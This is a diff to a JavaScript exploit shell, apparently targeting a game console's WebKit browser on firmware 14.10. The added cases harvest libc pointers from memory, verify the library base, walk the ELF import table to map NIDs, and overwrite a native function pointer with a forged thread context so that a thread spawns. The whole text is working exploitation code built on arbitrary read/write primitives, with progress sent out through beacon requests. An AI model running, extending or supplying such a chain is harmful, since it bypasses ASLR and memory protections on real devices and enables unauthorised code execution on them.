@@ -5824,6 +5824,316 @@ function _startWsShell(){
         break;
       }
 
+      case 'lcfind':{
+        /* THE LIBC POINTER HARVEST (route A step 1): collect FOREIGN
+         * module-band qwords from the PROVEN-readable bands:
+         *   stack [cfr-0x8000, cfr+0x2000)  - the sync-XHR call chain
+         *     runs JS -> WebKit -> libc right BELOW cfr: LIVE libc
+         *     return addresses sit there.
+         *   wk band [BASE+0x7000000, +0x7400000)  - WK data (proven).
+         *   cage [lowB, lowB+0x100000).
+         * Foreign = in [0x100000000, 0x10000000000) MINUS the known
+         * bands (lk+/-, BASE module, stack, cage). Offline: candidates
+         * C = P - knownOffs (the game lane 14.10 libc_addrofs), 16KB-
+         * aligned, ranked by agreement -> lcverify does the ONE
+         * deterministic read (C+0x1179A8 == lk+0xB50). PURE READS. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LF(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfrL=S.cfr;
+          var seen={},ptrs=[];
+          function band(start,len,tag){
+            for(var off=0;off<len;off+=0x2000){
+              var ws;
+              try{ws=S.absRead(start+BigInt(off),Math.min(0x2000,len-off));}catch(e){break;}
+              shMarkOk(start+BigInt(off));
+              for(var wi=0;wi<ws.length;wi++){
+                var v=ws[wi];
+                if(v<0x100000000n||v>=0x10000000000n)continue;
+                var key=v.toString(16);
+                if(seen[key])continue;
+                var bad=false;
+                if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))bad=true;
+                if(v>=0x10000000000n)bad=true;
+                if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)bad=true;
+                if(cfrL&&(v>cfrL-0x100000n&&v<cfrL+0x100000n))bad=true;
+                if(v>=0x10001c0000n&&v<0x1000210000n)bad=true;
+                if(!bad){seen[key]=1;ptrs.push({v:'0x'+v.toString(16),band:tag});}
+              }
+            }
+          }
+          if(cfrL)band(cfrL-0x8000n,0xA000,'stk');
+          if(S.BASE)band(S.BASE+0x7000000n,0x400000,'wk');
+          if(S.lowB)band(S.lowB,0x100000,'cage');
+          LF('1 harvest n='+ptrs.length);
+          reply.ptrs=ptrs.slice(0,300);
+          reply.n=ptrs.length;
+          reply.cfr='0x'+cfrL.toString(16);
+          reply.base='0x'+(S.BASE?S.BASE.toString(16):'0');
+        }catch(e2){reply.err='lcfind fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
+      case 'lcverify':{
+        /* THE DETERMINISTIC LIBC-BASE VERIFIER (route A step 3): the
+         * game-lane 14.10-proven gettimeofday IMPORT SLOT at libc+
+         * 0x1179A8 (boot-stable across two game-lane boots) contains
+         * lk_base+0xB50. ONE 8-byte read confirms/rejects the
+         * candidate. Only fire on offline-validated candidates
+         * (16KB-aligned + >=2 known-offset agreements). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LV(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
+        try{
+          var C=BigInt(msg.base);
+          if(C%0x4000n!==0n){reply.err='candidate not 16KB-aligned';break;}
+          /* the lk chain (same as xcl) */
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='lk base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          LV('1 lk=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.lk='0x'+B.toString(16);
+          var slot=S.absRead(C+0x1179A8n,8)[0];
+          var expect=B+0xB50n;
+          LV('2 slot=0x'+slot.toString(16)+' expect=0x'+expect.toString(16));
+          reply.slot='0x'+slot.toString(16);
+          reply.expect='0x'+expect.toString(16);
+          reply.confirmed=(slot===expect);
+        }catch(e2){reply.err='lcverify fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
+      case 'lcnid':{
+        /* THE SLOT<->NID MAP (route A step 4): walk the VERIFIED libc
+         * ELF: header -> phdrs -> PT_DYNAMIC -> DT_STRTAB/DT_SYMTAB/
+         * DT_JMPREL(+DT_RELA) -> for each import rela: GOT slot (r_
+         * offset) + sym idx (r_info>>32) -> dynsym st_name ->
+         * the NID STRING at strtab+st_name; read *GOT = the lk
+         * snippet RVA. TRIPLE CROSS-CHECK in-page: the entries whose
+         * lkRva = 0x3F0/0x410/0xB50 must be thr_exit/thr_new/
+         * gettimeofday NIDs (U5VD1P181iA / t1BJfub8VdY /
+         * n88vx3C5nW8). ALL READS = parsed live structure. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LN(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
+        try{
+          var C=BigInt(msg.base);
+          if(C%0x4000n!==0n){reply.err='base not 16KB-aligned';break;}
+          /* the lk chain */
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p2=S.absRead(node,0x60);
+            Q=p2[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='lk base unaligned';break;}
+          reply.lk='0x'+B.toString(16);
+          /* ELF header */
+          var eh=S.absRead(C,0x40);
+          var magic=Number(eh[0]&0xFFFFFFFFn);
+          if(magic!==0x464C457Fn){reply.err='not ELF: 0x'+magic.toString(16);break;}
+          var phoff=eh[4];
+          var phentsize=Number((eh[5]>>48n)&0xFFFFn);
+          var phnum=Number(eh[6]&0xFFFFn);
+          LN('2 phoff=0x'+phoff.toString(16)+' phentsize=0x'+phentsize.toString(16)+' phnum='+phnum);
+          if(phnum<1||phnum>64||phentsize!==0x38){reply.err='phdrs implausible';break;}
+          /* find PT_DYNAMIC */
+          var dynV=0n;
+          for(var pi=0;pi<phnum;pi++){
+            var ph=S.absRead(C+phoff+BigInt(pi*0x38),0x38);
+            if(Number(ph[0]&0xFFFFFFFFn)===2){dynV=C+ph[2];break;}
+          }
+          if(dynV===0n){reply.err='no PT_DYNAMIC';break;}
+          /* .dynamic walk */
+          var strtab=0n,symtab=0n,jmprel=0n,pltrelsz=0n,rela=0n,relasz=0n,syment=24n;
+          var dw=S.absRead(dynV,0x500);
+          for(var di=0;di+1<dw.length;di+=2){
+            var tag=dw[di],val=dw[di+1];
+            if(tag===0n)break;
+            if(tag===5n)strtab=val;
+            else if(tag===6n)symtab=val;
+            else if(tag===23n)jmprel=val;
+            else if(tag===2n)pltrelsz=val;
+            else if(tag===7n)rela=val;
+            else if(tag===8n)relasz=val;
+            else if(tag===11n)syment=val;
+          }
+          if(strtab===0n||symtab===0n){reply.err='no STRTAB/SYMTAG (str=0x'+strtab.toString(16)+' sym=0x'+symtab.toString(16)+')';break;}
+          LN('3 dyn: strtab=0x'+strtab.toString(16)+' symtab=0x'+symtab.toString(16)+' jmprel=0x'+jmprel.toString(16)+'+'+pltrelsz.toString(16)+' rela=0x'+rela.toString(16)+'+'+relasz.toString(16));
+          /* d_val entries are module-RELATIVE vaddrs (loader does not rewrite .dynamic) */
+          if(strtab===0n||strtab>0x800000n||symtab===0n||symtab>0x800000n){reply.err='dyn ptrs implausible (str=0x'+strtab.toString(16)+' sym=0x'+symtab.toString(16)+')';break;}
+          /* the imports: JMPREL first, then RELA GLOB_DATs */
+          var slots=[],offs=[];
+          if(jmprel!==0n&&pltrelsz>0n&&pltrelsz<0x4000n)offs.push([jmprel,pltrelsz]);
+          if(rela!==0n&&relasz>0n&&relasz<0x20000n)offs.push([rela,relasz]);
+          var seenSlot={};
+          for(var oi=0;oi<offs.length;oi++){
+            var baseR=offs[oi][0],lenR=Number(offs[oi][1]);
+            var rw=S.absRead(C+baseR,Math.min(lenR,0x20000));
+            for(var ri=0;ri+2<rw.length;ri+=3){
+              var rOff=rw[ri],rInfo=rw[ri+1];
+              var sym=Number(rInfo>>32n);
+              var typ=Number(rInfo&0xFFFFFFFFn);
+              if(typ!==6&&typ!==7)continue;   /* GLOB_DAT / JUMP_SLOT */
+              if(rOff===0n||seenSlot[rOff.toString(16)])continue;
+              seenSlot[rOff.toString(16)]=1;
+              slots.push({rOff:rOff,sym:sym});
+              if(slots.length>=240)break;
+            }
+            if(slots.length>=240)break;
+          }
+          LN('4 import slots='+slots.length);
+          /* dynsym -> NID strings; *GOT -> lk RVA */
+          var out=[];
+          for(var si2=0;si2<slots.length;si2++){
+            var symA=C+symtab+BigInt(slots[si2].sym*Number(syment));
+            var se=S.absRead(symA,0x18);
+            var stName=Number(se[0]&0xFFFFFFFFn);
+            if(stName===0)continue;
+            var strA=C+strtab+BigInt(stName);
+            if(strA<C||strA>C+0x800000n)continue;
+            var sb=S.absRead(strA,12);
+            /* rebuild bytes: qwords are LE; byte i of qword q = (q>>((i%8)*8))&0xff */
+            var bytes=[];
+            for(var q8=0;q8<sb.length;q8++){var w8=sb[q8];for(var k7=0;k7<8;k7++)bytes.push(Number((w8>>BigInt(k7*8))&0xFFn));}
+            var nid='';
+            for(var k8=0;k8<12;k8++){if(bytes[k8]===0)break;nid+=String.fromCharCode(bytes[k8]);}
+            var gotV=S.absRead(C+slots[si2].rOff,8)[0];
+            var rva=(gotV>B)?Number(gotV-B):-1;
+            out.push({nid:nid,got:'0x'+slots[si2].rOff.toString(16),lkRva:'0x'+rva.toString(16)});
+          }
+          reply.imports=out;
+          reply.n=out.length;
+          /* TRIPLE CROSS-CHECK: the entries whose lkRva = 0x3F0/0x410/0xB50
+           * must carry the thr_exit/thr_new/gettimeofday NIDs */
+          var checks=[],okc=0;
+          var WANT={'0x3f0':'U5VD1P181iA','0x410':'t1BJfub8VdY','0xb50':'n88vx3C5nW8'};
+          for(var ci=0;ci<out.length;ci++){
+            var w=WANT[out[ci].lkRva.toLowerCase()];
+            if(w){var good=(out[ci].nid===w);checks.push(out[ci].lkRva+'->'+out[ci].nid+(good?' OK':' MISMATCH(want '+w+')'));if(good)okc++;}
+          }
+          reply.cross=checks;
+          reply.crossOk=okc;
+          LN('5 imports='+out.length+' cross='+okc+'/3');
+        }catch(e2){reply.err='lcnid fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
+      case 'tws':{
+        /* THE FIXED SPAWN WITNESS (route B): the 156c DEVICE-PROVEN
+         * field map + ARMED GATES. The old twc NEVER armed
+         * magic@+0x108=0x480 / type@+0x110=0x10000 (and its cs@+0xE8
+         * story was unproven) - EVERY twc death was taken with a
+         * gateless ctx => ALL TEN LOTTERY ELIMINATIONS INVALID.
+         * Field map (156c/156d/272a, spawned rv=0 on 14.10):
+         *   RDI@+0x48  RIP@+0xE0  RSP@+0xF8  SS@+0x100  CS@+0xC0(156c
+         *   print)+0xE8(FreeBSD-consec, belt+braces)  RFLAGS@+0xF0
+         *   GATES: magic@+0x108=0x480, uc_flags@+0xD0<=7(0),
+         *   type@+0x110=0x10000.
+         * Child RIP = lk+0x3F0 (thr_exit): the child STARTS at the
+         * clean thread-exit stub => spawns, exits, PARENT SURVIVES.
+         * TID witness at [cfr] (RSI = tid out). RDX = the NE ptr
+         * (flags) - CAVEAT: if Sony validates flags==0 -> EINVAL ->
+         * survive (inconclusive but SAFE). Async beacons: a death
+         * still banks TWS-*. msg.rva = the snippet RVA (route A). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function TW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TWS-'+s),true);x.send();}catch(e){}}
+        try{
+          var cfrT=S.cfr;
+          if(!cfrT||cfrT<0x400000000n){reply.err='No cfr';break;}
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          TW('1 B=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          var rva=parseInt(msg.rva,16)||0x130;
+          var target=B+BigInt(rva);
+          reply.target='lk+0x'+rva.toString(16);
+          TW('2 target=0x'+target.toString(16)+' (lk+0x'+rva.toString(16)+')');
+          /* the child stack sled: [fakeScope+0x1200, +0x3800) filled
+           * with thr_exit (clean-exit ret-pops), top = fakeScope+0x3800 */
+          var sledBase=S.fakeScope+0x1200n;
+          var sledTop=sledBase+0x2600n;
+          for(var zi=0;zi<0x120/8;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);   /* zero ctx incl gates */
+          var fillN=0x2600/8;
+          for(var zi2=0;zi2<fillN;zi2++)S.absWrite(sledBase+BigInt(zi2*8),B+0x3F0n);
+          S.absWrite(sledTop-0x800n,B+0x3F0n);
+          TW('3 sled top=0x'+sledTop.toString(16)+' n='+fillN+' (all=thr_exit)');
+          /* THE 156c FIELD MAP + GATES */
+          S.absWrite(S.fakeScope+0x48n,0n);        /* mc_rdi = 0 (thr_exit arg) */
+          S.absWrite(S.fakeScope+0xC0n,0x43n);      /* cs (156c print) */
+          S.absWrite(S.fakeScope+0xE0n,B+0x3F0n);  /* mc_rip = thr_exit stub */
+          S.absWrite(S.fakeScope+0xE8n,0x43n);      /* cs (FreeBSD-consecutive, belt+braces) */
+          S.absWrite(S.fakeScope+0xF0n,0x202n);    /* rflags */
+          S.absWrite(S.fakeScope+0xF8n,sledTop);    /* mc_rsp = sled top */
+          S.absWrite(S.fakeScope+0x100n,0x3Bn);    /* ss */
+          S.absWrite(S.fakeScope+0x108n,0x480n);   /* *** THE MAGIC GATE (156c: needs 0x480) *** */
+          S.absWrite(S.fakeScope+0xD0n,0n);        /* uc_flags = 0 (<=7) */
+          S.absWrite(S.fakeScope+0x110n,0x10000n); /* *** THE TYPE GATE *** */
+          TW('4 ctx built rip=thr_exit rsp=0x'+sledTop.toString(16)+' GATES ARMED');
+          var cfrSave=S.absRead(cfrT,8)[0];
+          TW('5 cfr=0x'+cfrT.toString(16)+' save=0x'+cfrSave.toString(16));
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          TW('6 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          var tid=S.absRead(cfrT,8)[0];
+          TW('7 tid=0x'+tid.toString(16)+' (save=0x'+cfrSave.toString(16)+')');
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          TW('8 RESTORED');
+          reply.tid='0x'+tid.toString(16);
+          reply.tidWas='0x'+cfrSave.toString(16);
+          reply.threadCreated=(tid!==cfrSave&&tid>0n&&tid<0x100000n);
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+        }catch(e2){reply.err='tws fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'twc':{
         /* THE THR_CREATE WITNESS (the 80k-proven route): thr_create
          * (syscall 430) takes NO SIZE ARG - RDI = a ucontext_t I
